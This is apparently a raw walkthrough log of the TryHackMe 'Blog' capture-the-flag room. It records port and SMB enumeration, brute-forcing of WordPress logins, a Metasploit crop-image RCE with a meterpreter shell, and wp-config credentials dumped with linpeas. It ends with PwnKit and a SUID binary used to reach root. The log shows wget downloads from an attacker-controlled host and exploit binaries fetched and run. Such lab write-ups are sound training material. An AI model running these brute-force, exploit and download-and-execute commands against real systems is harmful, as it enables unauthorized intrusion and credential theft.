# https://tryhackme.com/room/blog

```bash
=================================
10.201.0.71 -- http://blog.thm -- win/lin x32/x64
=================================

export TARGET=10.201.0.71
echo '10.201.0.71 blog.thm' | sudo tee -a /etc/hosts

2025-08-16 17:28:21 -- sudo nmap -Pn -n -sC -sV -O -T4 -oA nmap_scan 10.201.0.71
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.0
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 3 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2025-08-16T21:28:41+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-08-16T21:28:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

### TASTY THINGS ###

// admin login (robots.txt)
http://blog.thm/wp-admin/
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
    Karen Wheeler on A Note From Mom
    Billy Joel on A Note From Mom
2025-08-16 18:16:20 -- hydra -o hydra -l admin -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:invalid" -V
2025-08-16 18:16:51 -- wpscan --output wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin,billy,karen

// wordpress
|_http-generator: WordPress 5.0
└─$ searchsploit "wordpress 5.0" | grep -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep -vE 'dos|denial|poc'
\n##> 2025-08-16 18:03:28 ## searchsploit "wordpress 5.0" | grep --color=auto -iE 'remote|rce|privilege|lpe|code execution|backdoor' | grep --color=auto -vE 'dos|denial|poc'
WordPress 5.0.0 - Image Remote Code Execution                                                                             | php/webapps/49512.py
WordPress Core 5.0 - Remote Code Execution                                                                                | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                                                               | php/remote/46662.rb
// ^ needs creds
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                               | php/remote/47187.rb
msf6 > search type:exploit wordpress 5.0

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/multi/http/wp_crop_rce                         2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1   exploit/unix/webapp/wp_property_upload_exec            2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2   exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce  2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode
   3     \_ target: PHP                                       .                .          .      .
   4     \_ target: Unix Command                              .                .          .      .
   5     \_ target: Linux Dropper                             .                .          .      .
   6     \_ target: Windows Command                           .                .          .      .
   7     \_ target: Windows Dropper                           .                .          .      .
   8   exploit/multi/http/wp_litespeed_cookie_theft           2024-09-04       excellent  Yes    Wordpress LiteSpeed Cache plugin cookie theft
   9     \_ target: PHP In-Memory                             .                .          .      .
   10    \_ target: Unix In-Memory                            .                .          .      .
   11    \_ target: Windows In-Memory                         .                .          .      .


// SMB2 signing optional

###

2025-08-16 17:54:01 -- gobuster dir --output gobuster --threads 10 --delay 500ms --wordlist /usr/share/wordlists/dirb/common.txt --expanded --url http://blog.thm
    
2025-08-16 18:27:02 -- curl --upload-file taco.php http://blog.thm/wp-content/uploads/taco.php
curl http://blog.thm/wp-content/uploads/taco.php
// no dice

2025-08-16 18:43:01 -- wpscan --url http://blog.thm/ --enumerate u
[+] kwheel
[+] bjoel
2025-08-16 18:47:10 -- wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel,bjoel

---

export TARGET=10.201.112.106
echo '10.201.112.106 blog.thm' | sudo tee -a /etc/hosts

2025-08-19 16:11:30 -- enum4linux -a 10.201.112.106
[+] Server 10.201.112.106 allows sessions using username '', password ''            BLOG           Wk Sv PrQ Unx NT SNT blog server (Samba, Ubuntu)     
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy\'s local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
        ---------       ----      -------
//10.201.112.106/print$ Mapping: DENIED Listing: N/A Writing: N/A           
//10.201.112.106/BillySMB       Mapping: OK Listing: OK Writing: N/A
[+] Attaching to 10.201.112.106 using a NULL share
S-1-22-1-1000 Unix User\bjoel (Local User)                                  
S-1-22-1-1001 Unix User\smb (Local User)

2025-08-19 16:20:48 -- smbclient -N //10.201.112.106/BillySMB
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020
// ^^^ this is a QR code... scanning

sudo apt-get install zbar-tools
2025-08-19 16:25:21 -- zbarimg check-this.png
QR-Code:https://qrgo.page.link/M6dE
https://www.youtube.com/watch?v=eFTLKWw542g
just a billy joel song

2025-08-19 16:38:12 -- hydra -l bjoel,smb -P /usr/share/wordlists/rockyou.txt ssh://10.201.112.106
// not working


// went to http://blog.thm/wp-login.php > F12 > Networking tab > do a login > Right-click > Copy value > Copy POST Data > Use that string to make login string for hydra
2025-08-19 17:31:48 -- hydra -o hydra -l kwheel -P /usr/share/wordlists/rockyou.txt blog.thm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username' -V
[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
// password!
=== OR ===
wpscan --url http://blog.thm/ --passwords /usr/share/wordlists/rockyou.txt --usernames kwheel --password-attack wp-login
 | Username: kwheel, Password: cutiepie1

2025-08-19 17:42:58 -- sshpass -p "cutiepie1" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kwheel@blog.thm
// no dice

2025-08-19 17:49:42 -- success!
use exploit/multi/http/wp_crop_rce
set payload php/meterpreter/bind_tcp
set RHOSTS blog.thm
set USERNAME kwheel
set PASSWORD cutiepie1
run

Computer    : blog
OS          : Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:
Meterpreter : php/linux

meterpreter > ls
Listing: /home/bjoel
====================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
020666/rw-rw-rw-  0      cha   2025-08-19 16:06:42 -0400  .bash_history
100644/rw-r--r--  220    fil   2018-04-04 14:30:26 -0400  .bash_logout
100644/rw-r--r--  3771   fil   2018-04-04 14:30:26 -0400  .bashrc
040700/rwx------  4096   dir   2020-05-25 09:15:58 -0400  .cache
040700/rwx------  4096   dir   2020-05-25 09:15:58 -0400  .gnupg
100644/rw-r--r--  807    fil   2018-04-04 14:30:26 -0400  .profile
100644/rw-r--r--  0      fil   2020-05-25 09:16:22 -0400  .sudo_as_admin_succ
100644/rw-r--r--  69106  fil   2020-05-26 14:33:24 -0400  Billy_Joel_Terminat
100644/rw-r--r--  57     fil   2020-05-26 16:08:47 -0400  user.txt
// not what i was wanting :(


execute -f 'python -c "import pty; pty.spawn(\"/bin/bash\")"' -i -t
cd /tmp
wget http://10.6.4.0:8000/linpeas.sh

### TASTY THINGS ###

// creds
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r----- 1 www-data www-data 3279 May 28  2020 /var/www/wordpress/wp-config.php                                                                           
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST', 'localhost');

// weird file
/usr/bin/gettext.sh

// SSH root keys?
-rw-r--r-- 1 root root 599 May 25  2020 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 171 May 25  2020 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 91 May 25  2020 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 391 May 25  2020 /etc/ssh/ssh_host_rsa_key.pub
PermitRootLogin yes

// user commands?
/home/bjoel/.bash_history
// size 0

###

2025-08-19 18:26:03 -- wpscan --url http://blog.thm/ --passwords passwords --usernames users --password-attack wp-login
[!] Valid Combinations Found:
 | Username: kwheel, Password: cutiepie1
 | Username: bjoel, Password: LittleYellowLamp90!@

2025-08-19 18:28:20 -- hydra -u -L list_users -P list_passwords $TARGET smb -V
// no

2025-08-19 18:34:25 -- sshpass -p 'LittleYellowLamp90!@' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bjoel@blog.thm
// nope

// other privesc
find / -perm -u=s -type f 2>/dev/null
ls -la /usr/sbin/checker
ltrace checker
export admin=1
checker

2025-08-19 18:35:36 -- privesc
cd /tmp
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
ip a ; python3 -m http.server 8000

wget http://10.6.4.0:8000/PwnKit
chmod +x PwnKit
2025-08-19 18:36:50 -- ./PwnKit

find / -type f -name "user.txt" 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt

find / -type f -name "root.txt" 2>/dev/null
/root/root.txt
```